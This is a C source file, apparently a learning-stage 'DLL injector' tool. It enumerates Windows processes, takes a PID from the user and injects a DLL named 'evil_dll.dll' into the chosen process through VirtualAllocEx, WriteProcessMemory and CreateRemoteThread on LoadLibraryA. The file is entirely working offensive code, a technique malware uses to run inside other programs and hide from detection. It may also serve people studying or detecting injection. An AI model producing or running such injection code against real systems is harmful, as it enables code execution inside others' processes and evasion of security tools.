#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

BOOL isWow64(HANDLE hProcess) {
    BOOL bIsWow64 = FALSE;

    typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

    if (fnIsWow64Process) {
        fnIsWow64Process(hProcess, &bIsWow64);
    }

    return bIsWow64;
}

int enumProc(){
    int proc_cnt = 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    Process32First(snapshot, &pe32);

    do {
        printf("[PID: %u] %s\n", pe32.th32ProcessID, pe32.szExeFile);
        proc_cnt++;
    } while (Process32Next(snapshot, &pe32));

    CloseHandle(snapshot);
    return proc_cnt;
}

int injectDLL(int PID){
    int is64 = 0;
    PCSTR evil_dll_path = "C:\\Users\\ridap\\Git\\Misc-Injector\\[lvl 0] DLL injector/evil_dll.dll";
    printf("[+] Get remote process handle\n");
    HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    LPVOID dll_allocated_path = VirtualAllocEx(hproc, NULL, strlen(evil_dll_path)+1, (MEM_COMMIT|MEM_RESERVE), PAGE_READWRITE);
    printf("[+] DLL name allocated\n");

    WriteProcessMemory(hproc, dll_allocated_path, evil_dll_path, strlen(evil_dll_path)+1, NULL);
    printf("[+] DLL name Written\n");
    FARPROC pLoadLibrary = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryA");
    printf("[+] LoadLibrary handle at : 0x%p\n", pLoadLibrary);
    HANDLE hThread = CreateRemoteThread(hproc, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, dll_allocated_path, 0, NULL);
    printf("[+] Executing remote LoadLibrary\n");

    printf("[+] Waiting for thread end\n");
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hproc);
    printf("[+] Done\n");
    return true;
}

int main(int argc, char **argv){
    int proc_cnt = enumProc();
    if (proc_cnt <= 0) return 1;

    int choice = -1;
    while (choice <= 0) {
        printf("[PID] > ");
        scanf("%d", &choice);
        if (choice <= 4) {
            printf("[-] Bad PID.\n");
            choice = -1;
        }
    }

    return injectDLL(choice);
}